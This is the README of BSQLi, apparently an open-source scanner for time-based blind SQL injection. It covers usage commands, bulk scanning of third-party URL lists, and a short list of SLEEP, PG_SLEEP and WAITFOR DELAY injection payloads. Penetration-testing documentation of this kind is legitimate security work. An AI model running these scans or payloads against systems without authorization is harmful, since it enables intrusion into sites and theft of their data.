# BSQLi - Blind SQL Injection Scanner
**BSQLi** is an advanced Blind SQL Injection scanner that uses time-based detection techniques to identify vulnerabilities in web applications.
![](https://github.com/Mr-r00t11/BSQLi/blob/main/img/BSQLi.png?raw=true)
## Key Features
- 🔍 **Automatic Parameter Detection**: Automatically analyzes URLs, request bodies, cookies, and JSON parameters
- ⏱️ **Time-Based Detection**: Identifies vulnerabilities through response delays
- 📁 **Burp Suite Compatibility**: Directly imports Burp Suite request files
- 🎯 **Flexible Scanning**: Supports single targets and massive lists
- 📊 **Detailed Reporting**: Generates comprehensive vulnerability reports

## Installation
```bash
git clone https://github.com/Mr-r00t11/BSQLi.git
cd BSQLi
pip3 install requests urllib3
```

## Basic Usage
### Single URL Scanning
```bash
# Basic URL scan
python3 BSQLi.py -u "http://example.com/page.php?id=1" -w payloads.txt

# With custom threshold
python3 BSQLi.py -u "http://example.com/page.php?id=1" -w payloads.txt -t 5

# Specific parameter testing
python3 BSQLi.py -u "http://example.com/page.php?id=1&search=test" -w payloads.txt -p "id"
```

### Using Burp Suite Files
```bash
# Scan from Burp file
python3 BSQLi.py -r request.txt -w payloads.txt

# With verbose mode for debugging
python3 BSQLi.py -r request.txt -w payloads.txt -v
```

### Bulk Scanning
```bash
# Scan URL list
python3 BSQLi.py -l urls.txt -w payloads.txt

# With custom timeout
python3 BSQLi.py -l urls.txt -w payloads.txt --timeout 60
```

### Generating Reports
```bash
# Save results to file
python3 BSQLi.py -u "http://example.com/page.php?id=1" -w payloads.txt -o report.txt

# Bulk scan with report
python3 BSQLi.py -l urls.txt -w payloads.txt -o bulk_report.txt
```

## Practical Examples
### Example 1: Simple Target
```bash
python3 BSQLi.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -w payloads/time-based.txt
```

### Example 2: With Burp File
```bash
# Export request from Burp Suite and save as 'request.txt'
python3 BSQLi.py -r request.txt -w payloads/time-based.txt -v
```

### Example 3: Mass Website Scanning
```bash
# Create 'targets.txt' file with URLs:
# http://site1.com/page?q=test
# http://site2.com/search?id=123
# http://site3.com/api/user?uid=1

python3 BSQLi.py -l targets.txt -w payloads/time-based.txt -t 8 -o scan_results.txt
```

### Example 4: Specific Parameter
```bash
python3 BSQLi.py -u "http://example.com/login?user=admin&pass=123" -w payloads.txt -p "user"
```

## Advanced Options
```bash
# Verbose mode for debugging
python3 BSQLi.py -u "http://example.com" -w payloads.txt -v

# Custom timeout (seconds)
python3 BSQLi.py -u "http://example.com" -w payloads.txt --timeout 45

# More sensitive detection threshold
python3 BSQLi.py -u "http://example.com" -w payloads.txt -t 3
```

## Input Formats
```bash
http://site1.com/page?param=value
http://site2.com/search?q=test
https://site3.com/api/data?id=123
```

### Payloads File (`-w`)
```bash
' OR SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'||PG_SLEEP(5)--
' WAITFOR DELAY '00:00:05'--
```

### Burp Suite File (`-r`)
```bash
GET /page.php?id=1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=abc123
Content-Type: application/x-www-form-urlencoded
```

## Detection Capabilities
- ✅ **GET/POST Parameters**
- ✅ **Cookies**
- ✅ **JSON Parameters**
- ✅ **Custom Headers**
- ✅ **HTTP Redirects**
- ✅ **Multiple HTTP Methods**

## Important Notes
- ⚠️ Only use on authorized systems
- 🔒 Script does not apply encoding to payloads
- 📈 Adjust threshold according to application latency
- 🐛 Use `-v` for debugging if issues occur
